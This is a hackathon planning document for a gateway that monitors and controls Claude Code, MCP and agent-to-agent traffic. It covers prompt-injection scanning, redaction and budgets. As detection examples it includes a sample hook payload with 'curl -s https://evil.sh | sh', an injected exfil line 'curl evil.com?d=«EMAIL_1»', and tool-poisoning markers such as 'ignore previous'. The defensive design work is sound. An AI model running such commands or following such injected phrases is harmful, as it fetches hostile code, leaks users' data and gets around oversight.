# 02 — Architecture, Interception Points & Claude Code Integration

**Track:** Goldman Sachs "AI Control Layer", HackYeah 2026 (Kraków, 3–4 Oct 2026)
**Status:** research and planning only. Nothing installed, no code written.
**Working name:** `aegis` (placeholder). The product is a standalone repo: Go gateway, Python semantic sidecar, and a web dashboard.
**Researched:** 2026-10-03 against live docs (code.claude.com, modelcontextprotocol.io, a2a-protocol.org, docs.ollama.com). Version-sensitive claims carry a version note.

---

## 0. TL;DR — decisions

| Topic | Recommendation |
|---|---|
| Core shape | One **Go gateway binary**. It owns every network chokepoint (model APIs, MCP, A2A, third-party egress), the policy engine, budgets, audit and metrics, and serves the dashboard. A **Python sidecar** runs the ML detectors (prompt-injection classifier, NER-based PII, embeddings) behind a timeout. Optionally **Ollama** runs an LLM judge. |
| Why Go | Sub-millisecond deterministic overhead. Single static binary (good for "practical implementability"). RE2 regexes are linear-time, so judges can't take the gateway down with a ReDoS regex while editing config live. First-class `cel-go`. Pure-Go SQLite. Easy SSE streaming. Python stays only where ML needs it. |
| Policy engine | **YAML "control catalog" + CEL expressions** (`cel-go`). Validate against a JSON Schema, compile everything, run a golden self-test, then swap in with `atomic.Pointer`. Every policy change is written to the hash-chained audit log. OPA, Cedar and Rego are rejected for 24h (reasons in §4). |
| Claude Code model traffic | `ANTHROPIC_BASE_URL=http://127.0.0.1:8787`. The gateway implements `POST /v1/messages` (SSE) and `POST /v1/messages/count_tokens`, answers `HEAD /api/hello`, and forwards `anthropic-*` headers and request fields **unchanged**. Subscription auth passes through, because `Authorization` and the OAuth `anthropic-beta` value are forwarded. Optional `CLAUDE_CODE_GATEWAY_HINT_HEADERS=1` for per-request class and prompt id. |
| Claude Code tool calls | **Command hooks** run a tiny Go binary, `aegis-hook`, which POSTs the hook JSON to the gateway. It covers `PreToolUse` (matcher `*`, so built-in and `mcp__*` tools), `PostToolUse`, `UserPromptSubmit`, `PermissionRequest`, `SessionStart`, `ConfigChange` and `Stop`/`SessionEnd`. A command wrapper is used rather than a `type:"http"` hook because **HTTP hooks fail open** on connection error or timeout. The wrapper can fail closed with `exit 2`. |
| Claude Code MCP | Every server entry points at the gateway. Remote servers become `http://127.0.0.1:8787/mcp/<name>`. Local servers are wrapped as `aegis-mcp stdio -- <real cmd>`. Hardening: `/Library/Application Support/ClaudeCode/managed-mcp.json` (exclusive control) or `allowedMcpServers` + `allowManagedMcpServersOnly`. |
| Data minimization | Redaction runs **in the gateway at each egress chokepoint**, before bytes leave the machine: model requests, MCP `tools/call` arguments, A2A messages, third-party HTTP. Rehydration runs **on the response path**. It uses a per-session placeholder vault keyed by `x-claude-code-session-id`. Deterministic placeholders keep Claude Code's prompt cache and thinking signatures valid. |
| Dashboard | Vite + React + TS + Tailwind + shadcn/ui + Recharts + Monaco (YAML with schema). It is **built into the Go binary with `go:embed`** and served at `/ui`. The live feed uses SSE (`EventSource`). |
| Storage | SQLite in WAL mode (`modernc.org/sqlite`, pure Go, no cgo) for the audit log, budget ledger and policy versions. An in-memory ring buffer feeds the live view. Audit export is JSONL/CSV, hash-chained. |
| RAM (8 GB) | Gateway about 50 MB. Sidecar about 0.5–0.9 GB with int8 ONNX models. Ollama with one 1–2B model about 1–1.5 GB. **No Docker.** |

---

## 1. Threat model and trust boundaries (what "egress" means here)

```
 TRUSTED (this Mac)                               |  UNTRUSTED / THIRD PARTY
                                                  |
 user ─ Claude Code harness ─ local tools (Bash,  |  Anthropic API (remote model)
        Read/Edit, stdio MCP servers)             |  OpenAI-compatible free tiers
 apps / agents (SDK)                              |  remote MCP servers (GitHub, Slack...)
 Ollama (local model)                             |  remote A2A agents
                 ▲                                |  arbitrary web (WebFetch, curl)
                 │ every crossing goes through    |
                 └──────── aegis gateway ─────────┘
```

* **Outbound (egress):** the gateway enforces policy, redacts PII, card numbers, secrets and metadata, and meters budget. This happens before any byte reaches a model, agent, MCP server or third-party API.
* **Inbound (ingress):** the gateway scans model output, tool results and MCP results. It looks for prompt injection, policy violations, data leaks and poisoned tool definitions. It rehydrates placeholders only for **trusted local destinations**.
* **Local actions** (Bash, file edits) don't cross the network. They are governed by **Claude Code hooks**, which are a pre-execution chokepoint, plus Claude Code's sandbox, which pushes sandboxed Bash network traffic through our egress proxy.
* Each destination gets a **trust zone** in config: `local`, `internal` or `remote`. Controls are conditioned on the zone, e.g. `PII → remote: redact`, `PII → local Ollama: allow`.

---

## 2. Interception points

### 2.1 Agent ↔ model: LLM reverse proxy

#### 2.1.1 Wire protocols to implement

| Surface | Endpoints | Streaming format | Usage for budgets | Client env var |
|---|---|---|---|---|
| **Anthropic Messages** | `POST /v1/messages` (path may carry `?beta=true`), `POST /v1/messages/count_tokens` (optional), `GET /v1/models` (optional), `HEAD /api/hello` (Claude Code warm-up probe, just return 200) | SSE: `message_start`, then repeated `content_block_start` / `content_block_delta` / `content_block_stop`, then `message_delta`, `message_stop`, with `ping` and `error` interleaved | `message_start.message.usage.input_tokens` (+ cache_read/cache_creation), `message_delta.usage.output_tokens` | `ANTHROPIC_BASE_URL` (Claude Code and the official Python/TS SDKs) |
| **OpenAI-compatible** | `POST /v1/chat/completions`, `GET /v1/models`, `POST /v1/embeddings`; optionally `/v1/responses` | SSE `data: {chunk}` lines, ending in `data: [DONE]` | Final chunk `usage` when `stream_options.include_usage=true`. The gateway injects this flag (safe for OpenAI-compatible backends; verify on Ollama). | `OPENAI_BASE_URL` (OpenAI SDKs v1+) |
| **Ollama native** | `POST /api/chat`, `POST /api/generate`, `POST /api/embed`, `GET /api/tags`, `POST /api/show` | NDJSON (one JSON object per line); the final object has `done: true` | `prompt_eval_count`, `eval_count`, `eval_duration` in the final object | `OLLAMA_HOST` (ollama CLI, ollama-python, ollama-js) |
| **Ollama Anthropic-compat** | Ollama itself serves `/v1/messages` (streaming, tools, basic thinking; **no** `count_tokens`, `tool_choice` or `cache_control`). Installed: **Ollama 0.24.0**. | Anthropic SSE | Anthropic SSE | Lets the gateway route an Anthropic-format request to a **local** model. |

**Zero-config trick for local models.** Move the real Ollama to `127.0.0.1:11435` (`launchctl setenv OLLAMA_HOST 127.0.0.1:11435`, then restart the Ollama app, or run `OLLAMA_HOST=127.0.0.1:11435 ollama serve`). Let the gateway listen on **11434**. Any tool that defaults to `localhost:11434` is then governed without reconfiguration.

**Routing.** One listener (`:8787`) with path-based surfaces:
- `/v1/messages*` → Anthropic surface
- `/openai/v1/*` → OpenAI-compatible surface (alternatively a second port, so `OPENAI_BASE_URL=http://127.0.0.1:8788/v1`)
- `/ollama/*` and port 11434 → Ollama native
- `/mcp/<server>` → MCP
- `/a2a/<agent>/*` → A2A
- `/egress/<service>/*` → third-party APIs
- `/v1/hooks/claude-code` → hook decisions
- `/v1/guard` → SDK decision API
- `/api/*` and `/ui` → dashboard

The Anthropic SDKs append `/v1/messages` to the base URL, so a path prefix also works. Serving Anthropic at the root of `:8787` is simplest for Claude Code. The **model allowlist + router** maps `model` to an upstream: `claude-*` → `api.anthropic.com`; `qwen3:*` and `llama*` → Ollama; `groq/*` → a free tier.

#### 2.1.2 Streaming inspection without killing latency

The goal is to keep time-to-first-token at the upstream's TTFT plus a few hundred microseconds, while still catching leaks in output. Design:

1. **Parse incrementally and flush per event.** Read the upstream body with `bufio.Reader` and split on blank lines (SSE) or `\n` (NDJSON). Process each event, write it, then `http.Flusher.Flush()`. Don't use `httputil.ReverseProxy` for the streamed routes, because events need rewriting. It's fine for passthrough-only routes with `FlushInterval: -1`.
2. **Per-content-block state machine.** Key it on the block `index`. Kinds: `text` (scan), `tool_use` (buffer), `thinking`/`redacted_thinking` (**pass through untouched**, because signatures cover them), `server_tool_use` (log).
3. **Sliding-window scanning for deterministic detectors** (secrets, PII, card numbers, banned strings, canary tokens):
   * Keep `tail = last (W−1)` characters of the block, where `W` is the longest pattern span (cap around 256).
   * Each delta runs Aho–Corasick plus RE2 over `tail + delta`. Matches that lie fully inside the old tail were already reported. Cost is O(delta) per event.
4. **Hold-back buffer when the action is `redact` (or rehydrate).**
   * Emit everything except the last `H` characters, where `H` is the maximum redactable token length, about 64–128 characters.
   * When a match or placeholder lands in the held region, rewrite it before emitting.
   * Cost: the stream lags by about `H` characters (a few tokens), which isn't visible to humans. On `content_block_stop`, flush the remainder.
5. **Buffer `tool_use` blocks entirely** (`content_block_start` plus all `input_json_delta` events until `content_block_stop`), then decide:
   * allow: emit as is
   * rehydrate placeholders: emit one consolidated `input_json_delta`
   * block: drop the block, or replace it with a text block explaining the block
   This costs nothing perceptible. With a custom base URL, Claude Code turns off fine-grained tool streaming by default, so tool JSON already arrives chunked late. It is also the only safe place to apply the **agent→model tool policy**, e.g. veto a `curl | sh` tool call before the harness sees it.
6. **Semantic detectors on output run asynchronously.**
   * Every `N` characters (about 400) or at a sentence boundary, submit the accumulated block text to the sidecar. At most one request is in flight per stream, coalescing newer text.
   * The stream keeps flowing. If a verdict says `block`, terminate at the next event boundary. The leak window is bounded by `N` plus the classifier latency.
   * Per-control `stream_mode`:
     * `passthrough`: async verdicts
     * `holdback`: deterministic redaction
     * `buffered`: hold the whole response; for high-risk routes only, because it adds the full generation time to TTFT
7. **Keep-alives.** Always forward `ping` events. While holding back, emit our own `ping` if more than 15 s pass without output. Claude Code aborts after **5 min** of no bytes (`CLAUDE_STREAM_IDLE_TIMEOUT_MS`).
8. **Graceful early termination (per protocol).** A malformed or truncated stream makes clients retry. Claude Code treats a body that ends early as a dropped connection and **re-issues the request**.
   * **Anthropic:** if a text block is open, emit a `text_delta` saying "[aegis: output stopped by control OUT-007]". Then emit `content_block_stop`, then `message_delta {stop_reason:"end_turn"}` with usage, then `message_stop`, then close. (`"refusal"` is the API's own stop reason for classifier interventions; test how Claude Code renders it before using it.)
   * **OpenAI:** emit a chunk with `finish_reason:"content_filter"`, then `data: [DONE]`.
   * **Ollama:** emit `{"done":true,"done_reason":"stop",...}`.
9. **Index integrity.** If a block is dropped or injected, **renumber `index`** on every later event. Claude Code stops reading the stream when an event references a block whose `content_block_start` never arrived or that already stopped ([gateway protocol §Streaming](https://code.claude.com/docs/en/llm-gateway-protocol#streaming)).

**Streaming pitfalls**
* Send `Accept-Encoding: identity` upstream, or gzip SSE won't parse.
* Set `X-Accel-Buffering: no` and `Cache-Control: no-cache`.
* Don't set `http.Server.WriteTimeout` on streaming routes.
* Propagate client disconnects with `ctx` so the upstream is cancelled and you stop paying for tokens nobody reads. Settle partial usage in the budget ledger.
* Forward error bodies **unmodified**. Claude Code matches upstream error wording to auto-recover from capability rejections.

#### 2.1.3 Request-side inspection: cost control for Claude Code's huge, repetitive bodies

Claude Code resends the whole conversation every turn, from hundreds of KB to several MB. Rescanning everything each turn is O(n²) over a session.
* **Content-addressed scan cache.** An LRU keyed by `sha256(block text)` stores findings and the redacted form. Only new blocks, usually the last user turn and the newest `tool_result`s, are scanned. This is a strong "performance efficiency" talking point: show the cache hit-rate on the dashboard.
* **Scan only untrusted segments with semantic models:** user text, `tool_result` content (web pages, MCP results, file contents), and A2A parts. Don't rescan the static system prompt every turn.
* **Prompt-injection classifiers have small windows** (Prompt Guard 2: 512 tokens). Chunk with overlap and take the max score.
* **Never modify** `system`, `tools`, thinking blocks, `cache_control` markers, or the beta header/body pairs. The docs say a gateway that rewrites bodies for inspection can break the header/body pairing, and that rewriting `system`, `tools` or earlier messages causes `bound to a different conversation` thinking-signature rejections ([gateway protocol §Feature pass-through, §Automatic retry](https://code.claude.com/docs/en/llm-gateway-protocol#feature-pass-through)).
* **When the policy says redact** (data minimization), rewrite only `text` and `tool_result` content. Do it deterministically (see §2.6), so every later turn produces a byte-identical history. That keeps the prompt cache and signatures valid.

#### 2.1.4 Budgets on the model path
* A price table in the catalog gives USD per MTok for input, output, cache-read and cache-write, per model. Local models get a notional price or a token/GPU-second budget (Ollama returns `eval_duration`).
* **Reserve → settle ledger.**
  1. At ingress, reserve the estimated input cost (from `count_tokens`, cached, or `chars/4`) plus `max_tokens × out_price`.
  2. Settle from actual `usage` at `message_delta` / `message_stop`.
  3. Mid-stream, track the running output estimate and **terminate gracefully** if a hard cap is crossed.
* **Scopes:** `session` (`x-claude-code-session-id`), `agent` (`x-claude-code-agent-id`), `team` (custom header via `ANTHROPIC_CUSTOM_HEADERS`, or virtual key), `model`, `route`, and `request_class` (`x-claude-code-request-class`: main, subagent, compaction, auxiliary; needs `CLAUDE_CODE_GATEWAY_HINT_HEADERS=1`, v2.1.273+).
* **Over budget, toward Claude Code:** return `429` with an Anthropic-format error body `{"type":"error","error":{"type":"rate_limit_error","message":"aegis: budget team:blue $5.00/day exhausted"}}`, plus **`retry-after: 3600`** and **`x-should-retry: false`**. Claude Code stops retrying immediately when `retry-after` is over 60 ([gateway protocol §Response headers](https://code.claude.com/docs/en/llm-gateway-protocol#response-headers)). A plain 429 would trigger up to 10 retries.
* **Soft limit** (e.g. 80%): allow, emit a dashboard warning, and optionally downgrade the model (router rewrites `model` to a cheaper or local one; a recorded decision).

#### 2.1.5 Policy block on the input side (model path)
There are two ways to signal a blocked request:
1. **Synthetic assistant reply (recommended for interactive clients).** Return 200 with a short, well-formed SSE (or JSON) assistant message: "aegis blocked this request: control INJ-003 (prompt injection, score 0.93). Incident #4711." `stop_reason` is `end_turn`. Claude Code shows it as the reply and the loop ends cleanly, with no retries.
2. **API error** `400 invalid_request_error` with an aegis message. Don't use wording that matches Claude Code's capability-rejection recovery (`thinking`, `output_config`, `Extra inputs are not permitted`, `cache_control`).

### 2.2 Agent ↔ MCP: MCP gateway

#### 2.2.1 Two protocol eras must be supported (important, new in 2026)
* **2025-11-25 and earlier (stateful):**
  * `initialize` / `notifications/initialized` handshake
  * `Mcp-Session-Id` header, ended with HTTP DELETE
  * optional GET SSE stream
  * server→client JSON-RPC requests (`sampling/createMessage`, `elicitation/create`, `roots/list`) on SSE streams
  * `Last-Event-ID` resumability
* **2026-07-28 (current; stateless)** ([changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog), [Streamable HTTP](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http)):
  * no `initialize` and no sessions
  * every request carries `_meta["io.modelcontextprotocol/protocolVersion"]`, `clientCapabilities` and `clientInfo`
  * new `server/discover`
  * GET stream replaced by `subscriptions/listen` (a long-lived POST response stream)
  * server→client requests replaced by **MRTR**: the result has `resultType:"input_required"` with `inputRequests`, and the client retries with `inputResponses`
  * `ping` removed; no resumability
  * **required HTTP headers mirrored from the body:** `MCP-Protocol-Version`, `Mcp-Method` and `Mcp-Name` (for `tools/call`, `resources/read`, `prompts/get`), plus `Mcp-Param-{Name}` for schema params annotated `x-mcp-header`. Non-ASCII values use Base64 sentinel encoding `=?base64?…?=`. A mismatch returns `400` with JSON-RPC `-32020 HeaderMismatch`.
  * list results carry `ttlMs` and `cacheScope`; tools should be listed in deterministic order.

**Design choice:** build a **message-level transparent proxy**, not an SDK-terminating one.
* Forward HTTP requests and responses as they are, including `Mcp-Session-Id` and all `Mcp-*` headers. Parse each JSON-RPC body and each SSE event, and rewrite only when policy demands it.
* This is era-agnostic and doesn't depend on which MCP version Claude Code currently speaks. It also avoids re-implementing session management.
* The official Go SDK (`github.com/modelcontextprotocol/go-sdk`) is still useful for **mock servers in the test suite**.

**Pitfalls for a rewriting proxy**
* If you redact `tools/call` arguments, **recompute `Mcp-Name` and every `Mcp-Param-*` header from the rewritten body**, or the server rejects the call with HeaderMismatch.
* **Never trust the mirrored headers for policy.** Decide on the parsed body, and reject when headers and body disagree. This is the smuggling defense the spec itself recommends for intermediaries.
* Validate `Origin` and bind to 127.0.0.1. The spec mandates DNS-rebinding protection.
* Keep SSE responses flushing (`X-Accel-Buffering: no`) and pass through `:` comment keep-alives.
* An MRTR `input_required` result can carry **sampling requests**, i.e. the server asking the client's model to generate. Treat these as an agent→model flow and apply the model-path policy. Under 2025-11-25 the same thing arrives as a server→client request on the SSE stream.

#### 2.2.2 Controls at each MCP message

| Message | Controls |
|---|---|
| `tools/list` result (and `prompts/list`, `resources/list`) | **Tool-poisoning scan** of `name`, `description`, `inputSchema` (including property `description`s and `x-*` fields) and `annotations`. Deterministic checks: hidden-instruction markers (`<IMPORTANT>`, "ignore previous", "do not tell the user"), references to other tools, sensitive file paths (`~/.ssh`, `.env`, `mcp.json`), exfil URLs, zero-width or Unicode tag characters, ANSI escapes, extremely long descriptions. Plus a semantic injection classifier. **Action:** strip the tool from the list (Claude Code never sees it), or quarantine it pending approval in the dashboard. **Allow/deny lists** per server and tool. |
| **Pinning (rug-pull defense)** | On first sight, store `sha256(canonical JSON of each tool definition)` per server in SQLite. This is trust-on-first-use, the same approach as Trail of Bits' `mcp-context-protector`. On every later `tools/list`, or a `list_changed` notification: if a hash differs, a tool was added, or a description changed, then **block calls to that tool** and either alert ("approve new version" in the dashboard with a diff) or auto-approve when the change only adds benign fields. Optionally ship pins in the policy file (`mcp.pins`) for a fixed allowlist. |
| `tools/call` request | Tool allowlist and per-tool CEL conditions, e.g. `args.path.startsWith('/tmp/demo')`. Argument DLP: PII, cards, secrets (redact or block **by destination trust zone**). Dangerous-argument signatures (SQL `DROP`, shell metacharacters for exec-like tools). Rate and budget per tool. |
| `tools/call` result (`content[]` text, images, `structuredContent`) | **Indirect prompt-injection scan** (semantic and signatures). Secrets and PII in results, redacted before the result reaches the model (minimization even toward the model). Size caps. Result-to-tool consistency checks. |
| `resources/read`, `prompts/get` | Same content scanning as results. |
| sampling / elicitation | Model-path policy (sampling). Elicitation **content** is data a server wants from the user, so block when it asks for credentials. |
| `subscriptions/listen` / GET stream | Pass through, but feed `notifications/tools/list_changed` into the pin checker. |

#### 2.2.3 stdio servers
* `aegis-mcp stdio --server fs -- npx -y @modelcontextprotocol/server-filesystem /tmp/demo`
* The wrapper spawns the real server, then pumps newline-delimited JSON-RPC both ways (stdin→child, child stdout→our stdout). Child stderr is passed through to our stderr.
* Each message is evaluated by the central gateway over loopback HTTP, so the dashboard sees everything. The wrapper keeps a tiny allow cache for hot paths. If the gateway is down, it fails closed: it returns a JSON-RPC error for `tools/call` and passes lifecycle messages through.
* **Pitfall:** never write anything except JSON-RPC to stdout, and keep message order per direction.
* **Pitfall:** under 2026-07-28 on stdio, cancellation still uses `notifications/cancelled`.

### 2.3 Agent ↔ agent: A2A gateway
* **A2A v1.0** ([spec](https://a2a-protocol.org/latest/specification/)) is now an AAIF/Linux Foundation project.
  * **Discovery:** Agent Card at `/.well-known/agent-card.json`. It lists `supportedInterfaces[]` (each with `protocolBinding`: `JSONRPC`, `GRPC` or `HTTP+JSON`; a `url`; a `protocolVersion`), `securitySchemes`, `capabilities` and `skills`, and is optionally signed.
  * **Operations:** `SendMessage`, `SendStreamingMessage` (SSE), `GetTask`, `ListTasks`, `CancelTask`, `SubscribeToTask`, the push-notification config CRUD, and `GetExtendedAgentCard`.
  * **REST binding:** `/message:send`, `/message:stream`, `/tasks/{id}`, `/tasks/{id}:cancel`, `/tasks/{id}:subscribe`.
  * **Service params:** `A2A-Version` and `A2A-Extensions` headers.
* **Where the gateway sits:** as a reverse proxy in front of each remote agent (`/a2a/<agent>/…`). Callers discover the agent through the gateway, which serves a **rewritten Agent Card** whose interface `url`s point back at the gateway.
  * **Pitfall:** rewriting breaks a signed card. Either re-sign it with a gateway key, which the client must trust, or keep the original card and configure clients with the gateway base URL.
* **Controls:**
  * caller→agent and skill authorization (CEL over caller identity, target agent and skill)
  * DLP on `Message.parts` (text parts, `data` JSON parts, file parts by URL and MIME type)
  * injection scanning of returned `Artifact`s and status messages
  * streaming termination using the same SSE machinery
  * **loop and depth guard**: inject an `X-Aegis-Hop` counter, and track `contextId` / `referenceTaskIds` fan-out
  * **push-notification webhook allowlist**: `Create…PushNotificationConfig` with an arbitrary URL is an exfil and SSRF vector
  * per-agent budgets (no token usage in A2A, so meter by bytes or characters, or by downstream model spend correlated through the gateway)
* For the 24h build, A2A is a **stretch**: two toy agents (official Python `a2a-sdk`) plus the gateway route and DLP. Model and MCP come first.

### 2.4 App ↔ agent: SDK wrapper / middleware

There are three thin integration options. Ship the first two.
1. **Base-URL wrapper (zero logic).** `aegis.wrap(OpenAI())` or `aegis.wrap(Anthropic())` in Python and TS just sets `base_url` to the gateway and adds `X-Aegis-App`, `X-Aegis-User` and `X-Aegis-Session` headers. Because all enforcement stays in the gateway, there is nothing to bypass in-process.
2. **Decision API for non-HTTP agent frameworks:**
   * Request: `POST /v1/guard {surface, direction, actor, destination, content|tool, args}`
   * Response: `{decision: allow|redact|block|ask, redacted, findings[], policy_version, latency_us}`
   * Hook it into LangGraph/CrewAI callbacks, Claude Agent SDK `canUseTool` or hook callbacks, etc. **Note:** an Agent SDK *callback* hook that times out **blocks** (fails closed), unlike settings-file HTTP and command hooks ([hooks §Timeouts](https://code.claude.com/docs/en/hooks#timeouts)).
3. **Generic forward-proxy mode** (`HTTPS_PROXY=http://127.0.0.1:8789`): host-level allow/deny for apps that can't change base URLs. See §2.5.

### 2.5 Egress to third-party services and tools (beyond LLM calls)

The user wants every outbound flow governed, not only model calls. Coverage map:

| Egress path | Chokepoint | What we can see and do |
|---|---|---|
| Model APIs (remote) | LLM proxy §2.1 | Full content: redact, block, budget |
| Remote MCP servers | MCP gateway §2.2 | Full JSON-RPC content: per-tool DLP by trust zone |
| Remote A2A agents | A2A gateway §2.3 | Full content |
| Claude Code **Bash** (curl, wget, git push, nc, scp…) | `PreToolUse` hook (full command text), plus **sandbox egress**: `sandbox.network.httpProxyPort: 8789` routes sandboxed Bash HTTP/HTTPS through our proxy | Hook: parse the command, extract hosts, look for secrets/PII in args, payload files (`-d @.env`) and encoders (`base64 .env`). Proxy: CONNECT host allow/deny and audit. HTTPS bodies aren't visible unless we MITM (stretch: local CA plus `NODE_EXTRA_CA_CERTS`; the sandbox also has an experimental `network.tlsTerminate`). |
| Claude Code **WebFetch** / **WebSearch** | `PreToolUse` hook (URL and query) | Block exfil via query strings and URL paths, and non-allowlisted domains. `updatedInput` can strip PII from a query before the fetch. |
| Claude Code MCP tools | `PreToolUse` (`mcp__server__tool`, `mcp_server.source`) **and** the MCP gateway | Two layers |
| App → third-party REST (Slack, Jira, webhooks) | **Service proxy** `/egress/<service>/…` with a catalog entry (`base_url`, `trust_zone`, `dlp: [pii, pci, secrets]`, JSON paths to inspect) | Full JSON DLP, reversible placeholders optional |
| Anything else from apps | Forward proxy `:8789` (`HTTPS_PROXY`) | Host-level only unless MITM |
| **Our own logs** | Audit writer | Store redacted payloads, finding types and HMAC fingerprints, never raw PII or secrets. Minimization applies to the control layer too. |
| Claude Code's own non-model traffic | `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1`, `skipWebFetchPreflight: true` | Turns off telemetry, update checks and the WebFetch domain preflight to api.anthropic.com |

### 2.6 Where redaction and rehydration run (data-minimization placement)

The redaction engine itself is another agent's track. This section covers placement and flow only.

```mermaid
sequenceDiagram
    autonumber
    participant CC as Claude Code / app (trusted)
    participant GW as aegis gateway
    participant V as Placeholder vault (per session, in-memory, TTL)
    participant UP as Remote model / MCP / 3rd-party (untrusted)

    CC->>GW: request (history + new user text / tool_result with PII)
    GW->>GW: scan new blocks (cache hit for old ones)
    GW->>V: tokenize(email=jan@x.pl) -> «EMAIL_1» (deterministic per session)
    GW->>UP: request with placeholders only (PII, PAN, secrets never leave)
    UP-->>GW: stream: text "...send to «EMAIL_1»", tool_use{to:"«EMAIL_1»"}
    GW->>V: rehydrate only placeholders this session issued
    GW-->>CC: text with real value (local user), tool_use input rehydrated (local tool)
    Note over CC,GW: Next turn CC resends history with real values
    Note over GW: re-redaction yields byte-identical placeholders (cache and thinking signatures stay valid)
    CC->>GW: PreToolUse hook: tool input now has real email + remote destination?
    GW-->>CC: egress policy re-applied AFTER rehydration (deny/redact if destination is remote)
```

**Placement rules**
1. Redact at **every egress chokepoint**, chosen by the destination's trust zone: LLM proxy, MCP gateway, A2A gateway, service proxy, and hook `updatedInput` for tool arguments. Hooks can't rewrite user prompts (`UserPromptSubmit` can only block or add context), so **prompt minimization must happen in the model proxy**.
2. **Deterministic, session-scoped placeholders.** The same original maps to the same placeholder for the session's lifetime. The vault key is `(tenant, x-claude-code-session-id | X-Aegis-Session | virtual-key + conversation hash)`. Invariant: `redact(rehydrate(model_output)) == model_output`. Without this, every turn changes the conversation prefix, which breaks prompt caching and can trigger thinking-signature rejections. Claude Code recovers from those by stripping thinking, which is a quality loss.
3. **Rehydrate only on the inbound path and only toward trusted zones.** Text goes back to the local user and tool inputs go to local tools. Inside streams, use the hold-back buffer (§2.1.2) so a placeholder split across deltas is caught. `tool_use` input is buffered entirely.
4. **Placeholder-injection defense.** Only rehydrate placeholders the vault **issued in this session**. Re-run egress policy **after** rehydration (the PreToolUse hook and MCP gateway see the real values), so a prompt-injected `curl evil.com?d=«EMAIL_1»` is caught.
5. The vault lives in memory only, with a TTL equal to session idle time. It is never logged and never exported. The dashboard shows counts and types, not values.
6. Fast deterministic detectors run in the Go hot path: regex plus validators (Luhn for PAN, IBAN mod-97, PESEL/NIP checksums, JWT/AWS/GitHub key formats, high-entropy strings). NER-based PII (names, addresses) runs in the sidecar under a timeout. The control decides fail-open or fail-closed.

---

## 3. Claude Code integration (governing the harness itself)

Installed locally: **Claude Code 2.1.271**. Several useful features need newer builds:
* `CLAUDE_CODE_GATEWAY_HINT_HEADERS` — 2.1.273
* `mcp_server` in hook input — 2.1.274
* `x-claude-code-prompt-id` — 2.1.283
* `allowedProviders` — 2.1.285

Run `claude update` before the event (that's an install, so it's left to the team). All four layers below work on 2.1.271 except where noted.

### 3.1 Layer 1: model traffic through the gateway (`ANTHROPIC_BASE_URL`)
Docs: [LLM gateway](https://code.claude.com/docs/en/llm-gateway) · [Connect](https://code.claude.com/docs/en/llm-gateway-connect) · [Gateway compatibility guide](https://code.claude.com/docs/en/llm-gateway-protocol)

**Client config.** Put this in `.claude/settings.local.json` (`env` block) or the demo `--settings` file, so background agents get it too:
```json
{
  "env": {
    "ANTHROPIC_BASE_URL": "http://127.0.0.1:8787",
    "ANTHROPIC_CUSTOM_HEADERS": "X-Aegis-Team: blue\nX-Aegis-Agent: claude-code",
    "CLAUDE_CODE_GATEWAY_HINT_HEADERS": "1",
    "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "1"
  }
}
```

**Auth modes**
* **A. Subscription passthrough** (likely, since no paid keys are given). Set only `ANTHROPIC_BASE_URL`. The claude.ai login stays the active credential. The gateway must forward `Authorization` **and** the `anthropic-beta` OAuth capability unchanged; stripping it returns 401. The docs describe this mode explicitly. Never log `Authorization`, and bind to 127.0.0.1.
* **B. Virtual keys.** Set `ANTHROPIC_AUTH_TOKEN=aegis_vk_blue_…`, sent as `Authorization: Bearer`. `ANTHROPIC_API_KEY` is sent as `x-api-key`. An `apiKeyHelper` value goes in both headers. The gateway maps the key to a team and budget, then swaps in the upstream credential or routes to local Ollama `/v1/messages`.

**Gateway contract** (from the compatibility guide)
* **Endpoints:** `/v1/messages` (matched on path; requests include `?beta=true`). `/v1/messages/count_tokens` is optional; without it, `/context` falls back to estimates. `HEAD /api/hello` is a warm-up probe and can be rejected harmlessly. `GET /v1/models?limit=1000` is used only with `CLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY=1`, has a 3 s timeout, and must not redirect.
* **Forward unchanged:** `anthropic-version`, `anthropic-beta` (verbatim, never allowlisted per value), and all `anthropic-*` headers and body fields as **open lists**.
* **Free to consume:**
  * `x-claude-code-session-id`, `x-claude-code-agent-id`, `x-claude-code-parent-agent-id`
  * with hint headers on: `x-claude-code-request-class`, `x-claude-code-agent-type`, `x-claude-code-compaction`, `x-claude-code-prompt-id`, `x-claude-code-prev-tool-durations` (format `Bash=742;Read=9`)
  * `ANTHROPIC_CUSTOM_HEADERS`
* **Response headers:**
  * `content-type: text/event-stream`
  * `retry-after` as integer seconds
  * pass `x-should-retry` through
  * forward `anthropic-ratelimit-unified-*`
  * error bodies **unmodified**
* **Streaming:**
  * no response buffering, no dropped, duplicated or reordered events
  * relay through `message_delta` / `message_stop`
  * forward `ping` (5-minute idle watchdog)
* **System prompt attribution block:** keep the `system` array exactly as received, with the block first and in its own entry. If the gateway must reshape `system`, set `CLAUDE_CODE_ATTRIBUTION_HEADER=0` on the client instead.
* **Things that bypass the gateway:** the fast-mode availability check and the WebFetch domain safety check call `api.anthropic.com` directly. Remote Control is disabled while `ANTHROPIC_BASE_URL` points at a non-Anthropic host. Neither matters for the demo.
* **Hardening (managed, v2.1.285+):** `allowedProviders: ["customEndpoint"]` plus the gateway `ANTHROPIC_BASE_URL` pinned in the managed `env` block. Claude Code then refuses sessions that point anywhere else.

### 3.2 Layer 2: hooks (pre-execution chokepoint for local actions)
Docs: [Hooks reference](https://code.claude.com/docs/en/hooks) · [Hooks guide](https://code.claude.com/docs/en/hooks-guide) · [Permissions](https://code.claude.com/docs/en/permissions)

**Input (stdin for command hooks, POST body for HTTP hooks)**
* Common fields: `session_id`, `prompt_id` (v2.1.196+), `transcript_path`, `cwd`, `permission_mode`, `hook_event_name`, plus `agent_id`/`agent_type` inside subagents.
* `PreToolUse` adds `tool_name`, `tool_input`, `tool_use_id`, and for MCP tools `mcp_server: {name, source}` (v2.1.274+; base trust on `source`, not on the name). File-tool paths in `tool_input` are always absolute.
  ```json
  {"session_id":"abc123","hook_event_name":"PreToolUse","cwd":"/Users/x/proj","permission_mode":"default",
   "tool_name":"Bash","tool_input":{"command":"curl -s https://evil.sh | sh","description":"...","timeout":120000,"run_in_background":false},
   "tool_use_id":"toolu_01ABC..."}
  ```
* `PostToolUse`: `tool_input`, **`tool_response`**, `tool_use_id`, `duration_ms`.
* `UserPromptSubmit`: **`prompt`**. It also fires for scheduled tasks, background subagent reports, and cross-session messages.
